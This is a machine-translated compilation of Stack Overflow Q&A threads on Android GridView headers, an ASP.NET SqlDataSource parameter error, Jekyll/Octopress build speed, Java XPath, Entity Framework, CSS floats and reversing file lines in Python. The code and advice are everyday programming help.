我知道 GridView 不支持页眉或页脚。我广泛使用 GridViews，我希望标题可以随之滚动。

解决问题的最佳方法是什么？扩展 GridView？扩展 ScrollView 或 ListView？

任何指针或建议将不胜感激！谢谢！

* * *

## 回答 #1

> 赞同：66
> 
> 时间：2014-07-07T18:13:18.287

谷歌的实现`HeaderGridView`解决了这个问题。它们是 GridView 的子类。

[HeaderGridView](https://android.googlesource.com/platform/packages/apps/Gallery2/+/idea133/src/com/android/photos/views/HeaderGridView.java)

我相信这要么是 Google+ 照片应用程序的一部分，要么是图库原生应用程序的一部分。

```
/*
 * Copyright (C) 2013 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.android.photos.views;
import android.content.Context;
import android.database.DataSetObservable;
import android.database.DataSetObserver;
import android.util.AttributeSet;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.Filter;
import android.widget.Filterable;
import android.widget.FrameLayout;
import android.widget.GridView;
import android.widget.ListAdapter;
import android.widget.WrapperListAdapter;
import java.util.ArrayList;
/**
 * A {@link GridView} that supports adding header rows in a
 * very similar way to {@link ListView}.
 * See {@link HeaderGridView#addHeaderView(View, Object, boolean)}
 */
public class HeaderGridView extends GridView {
    private static final String TAG = "HeaderGridView";
    /**
     * A class that represents a fixed view in a list, for example a header at the top
     * or a footer at the bottom.
     */
    private static class FixedViewInfo {
        /** The view to add to the grid */
        public View view;
        public ViewGroup viewContainer;
        /** The data backing the view. This is returned from {@link ListAdapter#getItem(int)}. */
        public Object data;
        /** <code>true</code> if the fixed view should be selectable in the grid */
        public boolean isSelectable;
    }
    private ArrayList<FixedViewInfo> mHeaderViewInfos = new ArrayList<FixedViewInfo>();
    private void initHeaderGridView() {
        super.setClipChildren(false);
    }
    public HeaderGridView(Context context) {
        super(context);
        initHeaderGridView();
    }
    public HeaderGridView(Context context, AttributeSet attrs) {
        super(context, attrs);
        initHeaderGridView();
    }
    public HeaderGridView(Context context, AttributeSet attrs, int defStyle) {
        super(context, attrs, defStyle);
        initHeaderGridView();
    }
    @Override
    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
        super.onMeasure(widthMeasureSpec, heightMeasureSpec);
        ListAdapter adapter = getAdapter();
        if (adapter != null && adapter instanceof HeaderViewGridAdapter) {
            ((HeaderViewGridAdapter) adapter).setNumColumns(getNumColumns());
        }
    }
    @Override
    public void setClipChildren(boolean clipChildren) {
       // Ignore, since the header rows depend on not being clipped
    }
    /**
     * Add a fixed view to appear at the top of the grid. If addHeaderView is
     * called more than once, the views will appear in the order they were
     * added. Views added using this call can take focus if they want.
     * <p>
     * NOTE: Call this before calling setAdapter. This is so HeaderGridView can wrap
     * the supplied cursor with one that will also account for header views.
     *
     * @param v The view to add.
     * @param data Data to associate with this view
     * @param isSelectable whether the item is selectable
     */
    public void addHeaderView(View v, Object data, boolean isSelectable) {
        ListAdapter adapter = getAdapter();
        if (adapter != null && ! (adapter instanceof HeaderViewGridAdapter)) {
            throw new IllegalStateException(
                    "Cannot add header view to grid -- setAdapter has already been called.");
        }
        FixedViewInfo info = new FixedViewInfo();
        FrameLayout fl = new FullWidthFixedViewLayout(getContext());
        fl.addView(v);
        info.view = v;
        info.viewContainer = fl;
        info.data = data;
        info.isSelectable = isSelectable;
        mHeaderViewInfos.add(info);
        // in the case of re-adding a header view, or adding one later on,
        // we need to notify the observer
        if (adapter != null) {
            ((HeaderViewGridAdapter) adapter).notifyDataSetChanged();
        }
    }
    /**
     * Add a fixed view to appear at the top of the grid. If addHeaderView is
     * called more than once, the views will appear in the order they were
     * added. Views added using this call can take focus if they want.
     * <p>
     * NOTE: Call this before calling setAdapter. This is so HeaderGridView can wrap
     * the supplied cursor with one that will also account for header views.
     *
     * @param v The view to add.
     */
    public void addHeaderView(View v) {
        addHeaderView(v, null, true);
    }
    public int getHeaderViewCount() {
        return mHeaderViewInfos.size();
    }
    /**
     * Removes a previously-added header view.
     *
     * @param v The view to remove
     * @return true if the view was removed, false if the view was not a header
     *         view
     */
    public boolean removeHeaderView(View v) {
        if (mHeaderViewInfos.size() > 0) {
            boolean result = false;
            ListAdapter adapter = getAdapter();
            if (adapter != null && ((HeaderViewGridAdapter) adapter).removeHeader(v)) {
                result = true;
            }
            removeFixedViewInfo(v, mHeaderViewInfos);
            return result;
        }
        return false;
    }
    private void removeFixedViewInfo(View v, ArrayList<FixedViewInfo> where) {
        int len = where.size();
        for (int i = 0; i < len; ++i) {
            FixedViewInfo info = where.get(i);
            if (info.view == v) {
                where.remove(i);
                break;
            }
        }
    }
    @Override
    public void setAdapter(ListAdapter adapter) {
        if (mHeaderViewInfos.size() > 0) {
            HeaderViewGridAdapter hadapter = new HeaderViewGridAdapter(mHeaderViewInfos, adapter);
            int numColumns = getNumColumns();
            if (numColumns > 1) {
                hadapter.setNumColumns(numColumns);
            }
            super.setAdapter(hadapter);
        } else {
            super.setAdapter(adapter);
        }
    }
    private class FullWidthFixedViewLayout extends FrameLayout {
        public FullWidthFixedViewLayout(Context context) {
            super(context);
        }
        @Override
        protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
            int targetWidth = HeaderGridView.this.getMeasuredWidth()
                    - HeaderGridView.this.getPaddingLeft()
                    - HeaderGridView.this.getPaddingRight();
            widthMeasureSpec = MeasureSpec.makeMeasureSpec(targetWidth,
                    MeasureSpec.getMode(widthMeasureSpec));
            super.onMeasure(widthMeasureSpec, heightMeasureSpec);
        }
    }
    /**
     * ListAdapter used when a HeaderGridView has header views. This ListAdapter
     * wraps another one and also keeps track of the header views and their
     * associated data objects.
     *<p>This is intended as a base class; you will probably not need to
     * use this class directly in your own code.
     */
    private static class HeaderViewGridAdapter implements WrapperListAdapter, Filterable {
        // This is used to notify the container of updates relating to number of columns
        // or headers changing, which changes the number of placeholders needed
        private final DataSetObservable mDataSetObservable = new DataSetObservable();
        private final ListAdapter mAdapter;
        private int mNumColumns = 1;
        // This ArrayList is assumed to NOT be null.
        ArrayList<FixedViewInfo> mHeaderViewInfos;
        boolean mAreAllFixedViewsSelectable;
        private final boolean mIsFilterable;
        public HeaderViewGridAdapter(ArrayList<FixedViewInfo> headerViewInfos, ListAdapter adapter) {
            mAdapter = adapter;
            mIsFilterable = adapter instanceof Filterable;
            if (headerViewInfos == null) {
                throw new IllegalArgumentException("headerViewInfos cannot be null");
            }
            mHeaderViewInfos = headerViewInfos;
            mAreAllFixedViewsSelectable = areAllListInfosSelectable(mHeaderViewInfos);
        }
        public int getHeadersCount() {
            return mHeaderViewInfos.size();
        }
        @Override
        public boolean isEmpty() {
            return (mAdapter == null || mAdapter.isEmpty()) && getHeadersCount() == 0;
        }
        public void setNumColumns(int numColumns) {
            if (numColumns < 1) {
                throw new IllegalArgumentException("Number of columns must be 1 or more");
            }
            if (mNumColumns != numColumns) {
                mNumColumns = numColumns;
                notifyDataSetChanged();
            }
        }
        private boolean areAllListInfosSelectable(ArrayList<FixedViewInfo> infos) {
            if (infos != null) {
                for (FixedViewInfo info : infos) {
                    if (!info.isSelectable) {
                        return false;
                    }
                }
            }
            return true;
        }
        public boolean removeHeader(View v) {
            for (int i = 0; i < mHeaderViewInfos.size(); i++) {
                FixedViewInfo info = mHeaderViewInfos.get(i);
                if (info.view == v) {
                    mHeaderViewInfos.remove(i);
                    mAreAllFixedViewsSelectable = areAllListInfosSelectable(mHeaderViewInfos);
                    mDataSetObservable.notifyChanged();
                    return true;
                }
            }
            return false;
        }
        @Override
        public int getCount() {
            if (mAdapter != null) {
                return getHeadersCount() * mNumColumns + mAdapter.getCount();
            } else {
                return getHeadersCount() * mNumColumns;
            }
        }
        @Override
        public boolean areAllItemsEnabled() {
            if (mAdapter != null) {
                return mAreAllFixedViewsSelectable && mAdapter.areAllItemsEnabled();
            } else {
                return true;
            }
        }
        @Override
        public boolean isEnabled(int position) {
            // Header (negative positions will throw an ArrayIndexOutOfBoundsException)
            int numHeadersAndPlaceholders = getHeadersCount() * mNumColumns;
            if (position < numHeadersAndPlaceholders) {
                return (position % mNumColumns == 0)
                        && mHeaderViewInfos.get(position / mNumColumns).isSelectable;
            }
            // Adapter
            final int adjPosition = position - numHeadersAndPlaceholders;
            int adapterCount = 0;
            if (mAdapter != null) {
                adapterCount = mAdapter.getCount();
                if (adjPosition < adapterCount) {
                    return mAdapter.isEnabled(adjPosition);
                }
            }
            throw new ArrayIndexOutOfBoundsException(position);
        }
        @Override
        public Object getItem(int position) {
            // Header (negative positions will throw an ArrayIndexOutOfBoundsException)
            int numHeadersAndPlaceholders = getHeadersCount() * mNumColumns;
            if (position < numHeadersAndPlaceholders) {
                if (position % mNumColumns == 0) {
                    return mHeaderViewInfos.get(position / mNumColumns).data;
                }
                return null;
            }
            // Adapter
            final int adjPosition = position - numHeadersAndPlaceholders;
            int adapterCount = 0;
            if (mAdapter != null) {
                adapterCount = mAdapter.getCount();
                if (adjPosition < adapterCount) {
                    return mAdapter.getItem(adjPosition);
                }
            }
            throw new ArrayIndexOutOfBoundsException(position);
        }
        @Override
        public long getItemId(int position) {
            int numHeadersAndPlaceholders = getHeadersCount() * mNumColumns;
            if (mAdapter != null && position >= numHeadersAndPlaceholders) {
                int adjPosition = position - numHeadersAndPlaceholders;
                int adapterCount = mAdapter.getCount();
                if (adjPosition < adapterCount) {
                    return mAdapter.getItemId(adjPosition);
                }
            }
            return -1;
        }
        @Override
        public boolean hasStableIds() {
            if (mAdapter != null) {
                return mAdapter.hasStableIds();
            }
            return false;
        }
        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            // Header (negative positions will throw an ArrayIndexOutOfBoundsException)
            int numHeadersAndPlaceholders = getHeadersCount() * mNumColumns ;
            if (position < numHeadersAndPlaceholders) {
                View headerViewContainer = mHeaderViewInfos
                        .get(position / mNumColumns).viewContainer;
                if (position % mNumColumns == 0) {
                    return headerViewContainer;
                } else {
                    if (convertView == null) {
                        convertView = new View(parent.getContext());
                    }
                    // We need to do this because GridView uses the height of the last item
                    // in a row to determine the height for the entire row.
                    convertView.setVisibility(View.INVISIBLE);
                    convertView.setMinimumHeight(headerViewContainer.getHeight());
                    return convertView;
                }
            }
            // Adapter
            final int adjPosition = position - numHeadersAndPlaceholders;
            int adapterCount = 0;
            if (mAdapter != null) {
                adapterCount = mAdapter.getCount();
                if (adjPosition < adapterCount) {
                    return mAdapter.getView(adjPosition, convertView, parent);
                }
            }
            throw new ArrayIndexOutOfBoundsException(position);
        }
        @Override
        public int getItemViewType(int position) {
            int numHeadersAndPlaceholders = getHeadersCount() * mNumColumns;
            if (position < numHeadersAndPlaceholders && (position % mNumColumns != 0)) {
                // Placeholders get the last view type number
                return mAdapter != null ? mAdapter.getViewTypeCount() : 1;
            }
            if (mAdapter != null && position >= numHeadersAndPlaceholders) {
                int adjPosition = position - numHeadersAndPlaceholders;
                int adapterCount = mAdapter.getCount();
                if (adjPosition < adapterCount) {
                    return mAdapter.getItemViewType(adjPosition);
                }
            }
            return AdapterView.ITEM_VIEW_TYPE_HEADER_OR_FOOTER;
        }
        @Override
        public int getViewTypeCount() {
            if (mAdapter != null) {
                return mAdapter.getViewTypeCount() + 1;
            }
            return 2;
        }
        @Override
        public void registerDataSetObserver(DataSetObserver observer) {
            mDataSetObservable.registerObserver(observer);
            if (mAdapter != null) {
                mAdapter.registerDataSetObserver(observer);
            }
        }
        @Override
        public void unregisterDataSetObserver(DataSetObserver observer) {
            mDataSetObservable.unregisterObserver(observer);
            if (mAdapter != null) {
                mAdapter.unregisterDataSetObserver(observer);
            }
        }
        @Override
        public Filter getFilter() {
            if (mIsFilterable) {
                return ((Filterable) mAdapter).getFilter();
            }
            return null;
        }
        @Override
        public ListAdapter getWrappedAdapter() {
            return mAdapter;
        }
        public void notifyDataSetChanged() {
            mDataSetObservable.notifyChanged();
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-12-28T11:42:42.123

我使用了来自 github 的[Stickygridheaders](http://tonicartos.github.io/StickyGridHeaders/)，非常漂亮和简单，试试吧。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-12-04T09:23:14.547

您必须**在调用** **setAdapter(new Your_Adapter)**之前添加页眉/页脚视图；

```
 Try below code:

  LayoutInflater layoutInflater = LayoutInflater.from(getActivity());
  View footerView = layoutInflater.inflate(R.layout.grid_view_footer, null);
  myListViewOrGridView.addFooterView(footerView);
  YourAdapter mAdapter = new YourAdapter(getActivity(), Your_Argument_Here);
  myListViewOrGridView.setAdapter(mAdapter); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-04T09:33:27.613

在这种情况下，我会选择扩展 GridView，因为它似乎是最简单的。如果您决定扩展 ListView 或 ScrollView，则必须首先实现所有 GridView 功能，这对您的情况来说是不必要的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-07-22T07:36:47.387

在自己实现之后，我可以说最简单的方法是制作一个处理列的适配器并使用带有默认标题的 ListView

我在这里发布了带有示例的代码：[https ://github.com/plattysoft/grid-with-header-list-adapter/](https://github.com/plattysoft/grid-with-header-list-adapter/)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2020-05-10T02:46:30.067

I know this is very old but if anyone runs into a bug that displays a white container at the bottom of the screen when using one of the custom GridView classes :

set the layouts heights above the GridView to `match_parent` instead of `wrap_content`

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-11-04T09:37:53.777

您可以在布局文件中的 GridView 正上方添加标题视图。喜欢：

```
<LinearLayout>
...
    <LinearLayout
        android:id="@+id/header" />
    <com.sample.MyGridView />
...
</LinearLayout> 
```

然后生成标题视图并将其添加到带有 id**标题的 LinearLayout**

```
View header = inflater.inflate(R.layout.head_view, null);
LinearLayout headerContainer = (LinearLayout) findViewById(R.id.header);
headerContainer.addView(header); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2015-02-09T21:03:13.977

我在 c# 中的代码如下所示

```
((HeaderViewGridAdapter)Adapter).NumColumns = NumColumnsCompatible;

private int NumColumnsCompatible
    {
        get
        {
            if (Build.VERSION.SdkInt >= BuildVersionCodes.Honeycomb)
            {
                return base.NumColumns;
            }
            else
            {
                try
                {
                    Field numColumns = this.Class.GetDeclaredField("numColumns");
                    numColumns.Accessible = true;

                    return numColumns.GetInt(this);
                }
                catch (Exception e)
                {
                    if (numColumns != -1)
                    {
                        return numColumns;
                    }
                    throw new Exception("Can not determine the NumColumns for this API platform, please call setNumColumns to set it.");
                }
            }
        }
    } 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2014-01-28T14:40:46.137

我找到了另一个允许在 gridView 上包含标题的库。

导入它我有点烦人，它有许多不需要的资源，但它工作正常：[**AStickyHeader**](https://github.com/DWorkS/AStickyHeader)

编辑：在标题上放置可点击视图似乎具有非常烦人的灵活性。

我认为最好的方法是从 GridView 扩展或以不同的方式实现它（如此处所示[**，**](https://github.com/munix/GridViewHeader)但它仅支持在 gridView 之上的单个标题）或使用带有线性布局的 listView 作为行。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-11-19T11:37:43.997

可以使用 ListView 内部使用的 HeaderViewListAdapter。它的限制是您必须具有与列相同数量的标题，并且标题不能跨越列（尽管您可以使用外观使其看起来如此）。

从好的方面来说，包装现有适配器并添加一些额外的标题单元非常容易，您不需要编写任何新代码。

# sqldatasource - 错误：必须声明标量变量 5

> ID：13217389
> 
> 赞同：1
> 
> 时间：2012-11-04T09:19:54.747
> 
> 标签：sqldatasource

我正在努力从经典 ASP 过渡到 ASP.NET。如果我硬编码开始日期和结束日期但给出错误，我有下面的代码：System.Data.SqlClient.SqlException：当我使用参数时必须声明标量变量“@SDate”。当我搜索它时，可能会引用此错误，但我找不到对我有帮助的错误。该页面旨在显示两个文本框，供用户输入搜索的开始和结束日期，然后单击按钮将数据导出到 Excel。

```
<%@ Page Language="C#" ContentType="text/html" ResponseEncoding="iso-8859-1" EnableViewStateMac="false"%>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<html>
<head>
<title>Export results to Excel</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<script language="C#" runat="server">

    protected void btnExportToExcel_Click(object sender, EventArgs e) {
        ExportToExcel();
    }

    //Export to Excel from a GridView
    protected void ExportToExcel() {
        Response.Clear();
        Response.Buffer = true;
        Response.ContentType = "application/vnd.ms-excel";
        Response.AddHeader("content-disposition", "attachment;filename=MyFiles.xls");
        Response.Charset = "";
        this.EnableViewState = false;

        System.IO.StringWriter sw = new System.IO.StringWriter();
        System.Web.UI.HtmlTextWriter htw = new System.Web.UI.HtmlTextWriter(sw);

        gvData.RenderControl(htw);

        Response.Write(sw.ToString());
        Response.End();
    }

    public override void VerifyRenderingInServerForm(Control control) {
    }
</script>

</head>
<body>
Export results to excel
</body>
    <form id="form1" runat="server">
    <div>
        <h1>
            My Files</h1>
        <table border="0" cellpadding="0" cellspacing="0" style="width: 100%; height: 12%">
            <tr>
                <td>
                    Start date</td>
                <td>
                    <asp:TextBox ID="StartDate" runat="server" Width="200px" Text="2000/01/01"></asp:TextBox>
                </td>
            </tr>
            <tr>
                <td>

                    End date</td>
                <td>
                    <asp:TextBox ID="EndDate" runat="server" Width="200px" Text="2012/11/01"></asp:TextBox>
                    </td>
            </tr>
            <tr>
                <td>

                </td>
                <td>
                    <asp:Button ID="btnExportToExcel" runat="server" Text="Export to Excel" onclick="btnExportToExcel_Click" />
                </td>
            </tr>
        </table>
    </div>
    <asp:SqlDataSource ID="SqlDataSource" runat="server" 
        ConnectionString="<%$ ConnectionStrings:KpraxConn %>" 
        SelectCommand="SELECT Results.IDNumber, [FirstName], [LastName], [DOB], [Gender] FROM [Results] LEFT JOIN Login ON (Results.IDNumber=Login.IDNumber) where ([LogDate]>=@SDate and [LogDate]<=@EDate) ORDER BY [LastName]">
        <asp:SelectParameters>
            <asp:FormParameter FormField="StartDate" Name="SDate" DefaultValue="2000/01/01" />
            <asp:FormParameter FormField="EndDate" Name="EDate" DefaultValue="2012/11/04"  />
        </asp:SelectParameters>
    </asp:SqlDataSource>

    <asp:GridView ID="gvData" runat="server" AutoGenerateColumns="False" DataKeyNames="IDNumber" 
        DataSourceID="SqlDataSource" PageSize="5">
        <Columns>
            <asp:BoundField DataField="IDNumber" HeaderText="IDNumber" ReadOnly="True"/>
           <asp:BoundField DataField="FirstName" HeaderText="FirstName"/>
           <asp:BoundField DataField="LastName" HeaderText="LastName"/>
           <asp:BoundField DataField="DOB" HeaderText="DOB"/>
           <asp:BoundField DataField="Gender" HeaderText="Gender"/>
        </Columns>
    </asp:GridView>
    </form>

</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T09:25:51.110

在按钮单击事件上调用此方法

受保护的无效 ExportToExcel() {

```
 Response.Clear();
 Response.AddHeader("content-disposition", "attachment;filename=GridView1.xls");
 Response.Charset = "";
 Response.ContentType = "application/vnd.xls";
 StringWriter StringWriter = new System.IO.StringWriter();
 HtmlTextWriter HtmlTextWriter = new HtmlTextWriter(StringWriter);
 GridView1.RenderControl(HtmlTextWriter);
 Response.Write(StringWriter.ToString());
 Response.End(); 
```

}

# ruby - 如何加快 Jekyll/Octopress 的生成速度？

> ID：13217394
> 
> 赞同：8
> 
> 时间：2012-11-04T09:20:39.363
> 
> 标签：ruby, jekyll, octopress

我使用 Octopress 作为我的博客引擎。这是完美的。但是如果有很多帖子，例如400+帖子，生成速度太慢了。

那么，有什么方法可以加快 Jekyll/Octopress 的生成速度？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-05T02:23:50.217

显然，如果您只是在处理一篇文章，则无需等待整个站点生成。您正在寻找的是 rake isolate[partial_post_name] 任务。
使用`rake isolate`，您可以仅“隔离”您正在处理的帖子并将所有其他帖子移至`source/_stash`文件夹。该`partial_post_name`参数只是帖子文件名中的一些单词。例如，如果我想将帖子与前面的示例隔离开来，我会使用

```
rake isolate[plain-english] 
```

这会将所有其他帖子移动到`source/_stash`并且仅将`2011-09-29-just-type-the-title-of-the-post-here-in-plain-english.markdown`帖子保留在`source/_posts`. 您也可以在跑步时执行此操作`rake preview`。它只会检测到巨大的变化，并且从那时起只会重新生成该帖子。

作者：[@Pavan Podila](https://twitter.com/pavanpodila)
更多信息：[加快 Octopress 站点生成的提示](http://blog.pixelingene.com/2011/09/tips-for-speeding-up-octopress-site-generation/)

2013.01.08 更新：
[Hexo](http://zespia.tw/hexo/) -- 一个快速、简单、强大的博客框架，由 Node.js 提供支持。
特点：难以置信的快速 - 生成静态文件一目了然

**2013.6.20 更新：**
**[gor](https://github.com/wendal/gor)** -- 用 Go gor 编写的静态网站和博客生成器引擎
有以下惊人的好处：**1\. 速度 -- 编译我在 wendal.net 上的近 200 个博客时不到 1 秒**2\. 简单 -- 只有编译后生成一个可执行文件，无其他依赖

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-11T09:20:29.930

您在编写时只能生成一篇文章

```
rake isolate[your-post] 
```

接着

```
rake integrate 
```

恢复正常。

要完全回答您的问题，您**不能只生成一篇文章**。你可以看到 Octopress 的[第 395 期](https://github.com/imathis/octopress/issues/395)关于该主题的内容，这说明这是由于 Jekyll 方面的限制。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-26T20:30:29.573

安装 Ruby GSL

```
gem install gsl 
```

您应该注意到速度增加了。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-22T03:33:49.053

由 Node.js 提供支持的 hexo。我正在使用它，比 Octopress 快得多。它提供了一种简单的方法，可以非常轻松地将您的文章迁移到 hexo。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-01-20T12:41:22.763

遇到同样的问题，但后来不太喜欢 rake 隔离的想法。此外，内置任务不与 _drafts 工作流集成。所以我最终使用的是创建一个自定义 config.yml，其中排除了 _posts 文件夹（使用排除），并且只构建了草稿文件夹。您可以将不同的配置文件作为命令行参数传递给 jekyll。我只是在积极撰写新帖子时使用它，而在发布时使用相同的旧方法（这仍然需要一些时间）。这种方法仅构建草稿帖子，我对此很满意。

```
jekyll build --watch --drafts --config _previewconfig.yml 
```

对于那些对完整工作流程感兴趣的人，请查看[这里](http://www.rahulpnath.com/blog/optimizing-octopress-workflow-for-new-posts/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-08-18T21:25:42.230

如果您的博客有很多图像（以及其他在构建之间不会更改的静态资产），那么值得将它们从 Jekyll 的构建过程中排除，而是根据需要手动更新它们。

无论出于何种原因，`Jekyll build`在处理此类资产时并不聪明。它将删除文件夹中的所有内容，并在**每次**构建时`public`重新复制内容。如果资产没有改变，这是一种浪费。这可以通过使用诸如 Robocopy (Windows) 或 Rsync (Linux) 之类的工具来避免，这些工具**只能**更新已更改的内容。`source`

 ****要告诉 Jekyll 忽略文件夹，请将以下内容添加到`_config.yml`：

```
exclude:     # exclude from build
  - folderPath
keep-files:  # do not delete/empty copy in `public`
  - folderPath 
```

然后在其他地方，使用您想要更新文件夹的任何工具。

* * *

有关您可以尝试的更多内容，请参阅[此帖子](https://mademistakes.com/articles/using-jekyll-2017/)。****

# java - Java xPath - 从 XML 中提取子文档

> ID：13217397
> 
> 赞同：2
> 
> 时间：2012-11-04T09:21:44.900
> 
> 标签：java, xml, xpath, extract

我有一个如下的 XML 文档：

```
<DocumentWrapper>
  <DocumentHeader>
    ...
  </DocumentHeader>
  <DocumentBody>
    <Invoice>
      <Buyer/>
      <Seller/>
    </Invoice>
   </DocumentBody>
 </DocumentWrapper> 
```

我想从中提取 DocumentBody 元素的内容作为字符串，原始 XML 文档：

```
<Invoice>
  <Buyer/>
  <Seller/>
</Invoice> 
```

使用 xPath 可能很简单：

```
/DocumentWrapper/DocumentBody 
```

不幸的是，我的 Java 代码不想按我的意愿工作。它返回空行而不是预期结果。有没有机会这样做，或者我必须返回 NodeList 然后从中生成 xml 文档？

我的Java代码：

```
XPathFactory xPathFactoryXPathFactory.newInstance();
XPath xPath xPathFactory.newXPath();
XPathExpression xPath.compile(xPathQuery);

String result = expression.evaluate(xmlDocument); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T15:44:19.773

调用此方法

```
String result = expression.evaluate(xmlDocument); 
```

和调用这个一样

```
String result = (String) expression.evaluate(xmlDocument, XPathConstants.STRING); 
```

返回结果节点的字符数据，如果结果节点是元素，则返回所有子节点的字符数据。

你可能应该做这样的事情：

```
Node result = (Node) expression.evaluate(xmlDocument, XPathConstants.NODE);
TransformerFactory.newInstance().newTransformer()
            .transform(new DOMSource(result), new StreamResult(System.out)); 
```

# c# - 对象引用未设置为对象的实例 (2)

> ID：13217402
> 
> 赞同：1
> 
> 时间：2012-11-04T09:22:42.333
> 
> 标签：c#, asp.net-mvc-3

我在 asp.net mvc3 中使用实体框架，当我尝试向表中添加新记录时出现此错误。这是我的代码

```
namespace CvGenerator.Models
{
    public class LogInEntities:DbContext
    {
        public DbSet LogIn { get; set; }

        protected override void OnModelCreating(DbModelBuilder modelBuilder)
        {
            modelBuilder.Conventions.Remove<IncludeMetadataConvention>();
            modelBuilder.Entity<LogIn>().ToTable("LogInData");
            base.OnModelCreating(modelBuilder);
        }
    }

} 
```

模型控制器：

```
public class LogIn
{
    public int LogInId { get; set; }
    public string NameAndSurname { get; set; }
    public string Email { get; set; }
    public virtual ICollection<LogIn> LogInCol { get; set; }
} 
```

我使用ajax调用来记录数据的方法：

```
public void LogIn(string email,string nameAndSurname)
{
    LogInEntities logIndb = new LogInEntities();
    LogIn logIn = new LogIn();

    if(ModelState.IsValid)
    {
        logIn.Email = email;
        logIn.NameAndSurname = nameAndSurname;
        ***logIndb.LogIn.Add(logIn);***
        logIndb.SaveChanges();
    }
} 
```

在标记的行上，我得到了例外

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T09:35:13.120

尝试 DbSet<Login> 登录

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T09:33:30.753

看看我只是对你的`LogIn` 属性和构造函数做了一点改动`LogInEntities`。

希望你现在不会在提到的那一行得到例外。

```
namespace CvGenerator.Models
{
    public class LogInEntities:DbContext
    {
        List<DbSet> lgn;
        public LogInEntities()
        {
             lgn = new List<DbSet>();
        }
        public List<DbSet> LogIn { get{return lgn;} set{lgn=value;} }

        protected override void OnModelCreating(DbModelBuilder modelBuilder)
        {
            modelBuilder.Conventions.Remove<IncludeMetadataConvention>();
            modelBuilder.Entity<LogIn>().ToTable("LogInData");
            base.OnModelCreating(modelBuilder);
        }
    }

} 
```

模型控制器：

```
public class LogIn
{
    public int LogInId { get; set; }
    public string NameAndSurname { get; set; }
    public string Email { get; set; }
    public virtual ICollection<LogIn> LogInCol { get; set; }
} 
```

我使用ajax调用来记录数据的方法：

```
public void LogIn(string email,string nameAndSurname)
{
    LogInEntities logIndb = new LogInEntities();
    LogIn logIn = new LogIn();

    if(ModelState.IsValid)
    {
        logIn.Email = email;
        logIn.NameAndSurname = nameAndSurname;
        ***logIndb.LogIn.Add(logIn);***
        logIndb.SaveChanges();
    }
} 
```

在标记的行上，我得到了例外

# css - div内的浮动元素

> ID：13217404
> 
> 赞同：1
> 
> 时间：2012-11-04T09:22:57.860
> 
> 标签：css

我有这个结构：

```
 <div id="wrapper2">
<div id="smallImages">
    <span>
       Small Image 1
    </span>
      <span>
          Small Image 2
    </span>
      <span>
          Small Image 3
    </span>
</div>  
   </div> 
```

问题是当我尝试浮动该 div 内的跨度时。当我浮动它们时，它们会脱离 div 的流动。div 实际上位于它们上方。请注意，它们都适合 div 的宽度。

CSS：

```
#smallImages{
    margin:auto;
    background-color:#267990;
    width:300px;
}

#smallImages span{
    background-color:#f18e99;
    width:90px;
     height:150px;
     display:block;
float:left;
  } 
```

为什么会这样？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T09:32:23.500

在计算父元素的高度时不考虑浮动元素，如果父元素的高度`overflow`是`visible`根据[CSS2 规范](http://www.w3.org/TR/CSS2/visudet.html#normal-block)设置的。

然而，有一些 CSS hack 可以解决这个问题：[https ://stackoverflow.com/a/11597829/384617](https://stackoverflow.com/a/11597829/384617)

# file - Python 3以相反的顺序将输入文件写入输出文件

> ID：13217405
> 
> 赞同：3
> 
> 时间：2012-11-04T09:23:13.453
> 
> 标签：file, python-3.x, reverse

我试过搜索，但我没有找到我需要的东西。我正在使用 python 3，我需要帮助以相反的顺序将文本文件写入不同的输出文件。

**所以这将是输入文件**

```
Hey, I am Fred

Fred, what's up

Fred fred fred 
```

**这将是输出文件**

```
Fred fred fred

Fred, what's up

Hey, I am Fred 
```

如果有人对如何完成有任何见解，我将不胜感激，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T09:41:32.493

```
with open (input_file_name) as fi, open(output_file_name, 'w') as fo:
    fo.writelines(reversed(fi.readlines())) 
```

如果 input_file 格式错误（最后一行不以 '\n' 结尾），您可以使用快速（可能不太有效）的 hack：

```
with open ('c:\\temp\\input_file') as fi, open('c:\\temp\\output_file', 'w') as fo:
    fo.write('\n'.join(reversed(fi.read().splitlines()))) 
```

# java - JavaBeans 属性适配器如何工作？

> ID：13217407
> 
> 赞同：3
> 
> 时间：2012-11-04T09:23:21.910
> 
> 标签：java, javafx-2

